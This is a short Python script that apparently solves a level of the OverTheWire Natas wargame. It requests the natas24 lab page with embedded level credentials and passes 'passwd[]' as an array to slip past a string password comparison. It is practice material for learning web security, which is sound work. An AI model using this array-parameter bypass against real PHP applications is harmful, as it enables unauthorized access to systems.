import requests

target = 'http://natas24:OsRmXFguozKpTZZ5X14zNO43379LZveg@natas24.natas.labs.overthewire.org?passwd[]'
r = requests.get(target)
print r.text